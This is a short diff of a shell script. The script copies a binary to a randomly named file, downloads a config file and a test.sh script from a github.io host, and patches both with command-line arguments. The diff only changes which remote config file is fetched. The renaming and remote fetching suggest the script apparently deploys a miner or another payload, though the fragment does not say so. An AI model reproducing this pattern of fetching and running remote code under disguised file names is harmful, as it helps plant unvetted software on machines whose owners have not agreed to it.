@@ -5,7 +5,7 @@ NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
 BB=za$NEW_UUID
 cp oxm $BB
 echo $NN >> $BB
-wget https://pzeankto.github.io/namnam/arqt.json -O config.json
+wget https://pzeankto.github.io/namnam/sumo.json -O config.json
 wget https://pzeankto.github.io/namnam/test.sh -O test.sh
 sed -i "s/PSPS/$1/g" config.json
 sed -i "s/ELKONTA/$2/g" test.sh
